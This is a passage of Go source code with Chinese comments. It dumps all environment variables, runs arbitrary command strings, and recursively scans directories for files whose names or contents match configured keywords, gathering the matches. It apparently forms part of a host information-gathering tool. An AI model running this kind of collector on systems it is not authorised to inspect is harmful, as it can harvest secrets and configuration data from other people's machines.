	var returnStr string
	envs := os.Environ()

	for _, e := range envs {
		parts := strings.SplitN(e, "=", 2)
		if len(parts) != 2 {
			continue
		} else {
			str := string(parts[0]) + "=" + string(parts[1]) + "\n"
			returnStr += str
		}
	}
	return returnStr

}

func runCmd(cmdStr string) string {

	list := strings.Split(cmdStr, " ")
	if list[0] == "dir" {
		if len(list) != 1 {
			return readCurrentDir(list[1])
		} else {
			return readCurrentDir(".")
		}
	}
	if list[0] == "set" {
		return getEnvs()
	}

	cmd := exec.Command(list[0], list[1:]...)
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		value, _ := GbkToUtf8(stderr.Bytes())
		return string(value)
	} else {
		value, _ := GbkToUtf8(out.Bytes())
		return string(value)
	}
}

func GbkToUtf8(s []byte) ([]byte, error) {
	//第二个参数为“transform.Transformer”接口，simplifiedchinese.GBK.NewDecoder()包含了该接口
	reader := transform.NewReader(bytes.NewReader(s), simplifiedchinese.GBK.NewDecoder())
	d, e := ioutil.ReadAll(reader)
	if e != nil {
		return nil, e
	}
	return d, nil
}

func FileContentScan(location string, coller *Collector) {
	if !isInArray(&coller.SuffixTypes, "*") {
		if !isInArray(&coller.SuffixTypes, path.Ext(location)) {
			println("=========不是目標Suffix" + location)
			return
		}
	}

	//只读方式打开源文件
	sF, err1 := os.Open(location)
	if err1 != nil {
		fmt.Println("err1=", err1)
		return
	}
	defer sF.Close()
	buf := make([]byte, 4*1024) //4k大小临时缓冲区
	var tagetb []byte
	for {
		_, err := sF.Read(buf) //从源文件读取内容,每次读取一部分
		if err != nil {
			if err == io.EOF { //文件读取完毕
				break
			}
			fmt.Println("err=", err)

		}
		//往目的文件写，读多少写多少
		tagetb = append(tagetb, buf...)
	}
	if len(tagetb) != 0 {
		str := string(DecodeToUtf8(tagetb))
		SearchTo(location, str, coller)
	}

}

func SearchTo(location string, content string, coller *Collector) {
	//下面是查询关键词：
	for _, key := range coller.ContentKeys {
		indexs := GetTagertIndexs(content, key)
		for _, index := range indexs {
			a := strings.Split(string(content[index:]), "\r")
			result := fmt.Sprintf("文件路径：%v \t\t 数据值：%v", location, a[0])
			if !isInArray(&coller.ContentScanTagerts, result) {
				coller.ContentScanTagerts = append(coller.ContentScanTagerts, result)
				coller.ContentTargetsPath = append(coller.ContentTargetsPath, location)
			}

		}
	}
}

// 获取key在Str中出现的所有位置
func GetTagertIndexs(Str string, key string) []int {
	var indexs []int
	var spilts []string
	sum := 0
	count := strings.Count(Str, key)
	for i := 0; i < count; i++ {
		index := strings.Index(Str, key)
		index = index + sum
		indexs = append(indexs, index)
		spilts = strings.SplitN(Str, key, 2)
		Str = spilts[len(spilts)-1]
		sum = index + len(key)
	}
	return indexs
}

func DecodeToUtf8(contents []byte) []byte {

	r := bytes.NewReader(contents)
	d, _ := charset.NewReader(r, "gb2312")
	content, _ := ioutil.ReadAll(d)
	return content
}
func DirScan(location string, coller *Collector) {
	var dirfiles []string
	err := GetAllFile(location, &dirfiles, &coller.SuffixTypes, &ignoreFile, &ignorePath, &ignoreType)
	if err != nil {
		fmt.Printf(err.Error() + "\n")
		return
	}
	if coller.NameKeys == nil || isInArray(&coller.NameKeys, "*") || len(coller.NameKeys) == 0 {
		for _, file := range dirfiles {
			fmt.Println("正在處理============" + file)
			if IsDir(file) {
				DirScan(file, coller)
			}
			coller.FliesScanTargets = append(coller.FliesScanTargets, file)
		}
	} else {
		for _, file := range dirfiles {
			fmt.Println("正在處理============" + file)
			for _, key := range coller.NameKeys {
				FileNameScan(file, key, coller)
			}
			// 如果是子文件夹，再扫描
			if IsDir(file) {

				DirScan(file, coller)
			}
		}
	}

}
func Fmtlog(strs []string) {
	for _, str := range strs {
		fmt.Println(str)
	}
}
func FmtGet(strs []string) string {
	var result string
	for _, str := range strs {
		result += fmt.Sprintln(str)
	}
	return result
}
func FileNameScan(file string, key string, coller *Collector) {
	fname := filepath.Base(file)
	//判断是否包含关键词
	if strings.Contains(fname, key) {
		if !isInArray(&coller.FliesScanTargets, file) {
			coller.FliesScanTargets = append(coller.FliesScanTargets, file)
		}

	}
}
func IsDir(name string) bool {
	if info, err := os.Stat(name); err == nil {
		return info.IsDir()
	}
	return false
}
func (cc CollectConfig) FindByShortName(short_name string) Collector {
	var targetCollector Collector
	for _, collector := range cc.Collectors {
		if collector.ShortName == short_name {
			targetCollector = collector
		}
	}
	return targetCollector
}
func GetAllFile(path string, files *[]string, targetType *[]string, ignoreFile *[]string, ignorePath *[]string, ignoreType *[]string) (err error) {

	if !isAllEmpty(targetType) && !isAllEmpty(ignoreType) {

		fmt.Printf("WARNGING: 目标文件类型已指定, 忽略文件类型无须指定。后续处理中忽略文件类型作为空处理\n")
	}

	err = getAllFileRecursion(path, files, targetType, ignoreFile, ignorePath, ignoreType)
	return err
}

// 判断数组各元素是否是空字符串或空格
func isAllEmpty(list *[]string) (isEmpty bool) {

	if len(*list) == 0 {
		return true
	}

	isEmpty = true
	for _, f := range *list {

		if strings.TrimSpace(f) != "" {
			isEmpty = false
			break
		}
	}

	return isEmpty
}
func getAllFileRecursion(path string, files *[]string, targetType *[]string, ignoreFile *[]string, ignorePath *[]string, ignoreType *[]string) (err error) {
	l, err := ioutil.ReadDir(path)
	if err != nil {
		return err
	}

	separator := string(os.PathSeparator)
	for _, f := range l {
		tmp := string(path + separator + f.Name())

		if f.IsDir() {
			*files = append(*files, tmp)
			// 过滤被忽略的文件夹（文件夹名完全相同）
			if !isInArray(ignorePath, f.Name()) {

				err = getAllFileRecursion(tmp, files, targetType, ignoreFile, ignorePath, ignoreType)
				if err != nil {
					return err
				}
			}
		} else {
			// 目标文件类型被指定
			if !isAllEmpty(targetType) {

				// 属于目标文件类型
				if isInSuffix(targetType, f.Name()) {

					// 忽略文件为空 或者 目标文件中不含有指定忽略文件
					if isAllEmpty(ignoreFile) || !isInArray(ignoreFile, f.Name()) {

						*files = append(*files, tmp)
					}
				}
			} else { // 目标文件类型为空

				// 忽略文件类型被指定
				if !isAllEmpty(ignoreType) {

					// 不属于忽略文件类型
					if !isInSuffix(ignoreType, f.Name()) {

						// 忽略文件为空 或者 目标文件中不含有指定忽略文件
						if isAllEmpty(ignoreFile) || !isInArray(ignoreFile, f.Name()) {

							*files = append(*files, tmp)
						}
					}
				} else { // 忽略文件类型为空

					// 忽略文件为空 或者 目标文件中不含有指定忽略文件
					if isAllEmpty(ignoreFile) || !isInArray(ignoreFile, f.Name()) {

						*files = append(*files, tmp)
					}
				}
			}
		}
	}

	return nil
}

// 判断目标字符串的末尾是否含有数组中指定的字符串
func isInSuffix(list *[]string, s string) (isIn bool) {

	isIn = false
	for _, f := range *list {

		if strings.TrimSpace(f) != "" && strings.HasSuffix(s, f) {
			isIn = true
			break
		}
	}

	return isIn
}

// 判断目标字符串是否是在数组中
func isInArray(list *[]string, s string) (isIn bool) {

	if len(*list) == 0 {
		return false
	}

	isIn = false
	for _, f := range *list {

		if f == s {
			isIn = true
			break
		}
	}

	return isIn
}
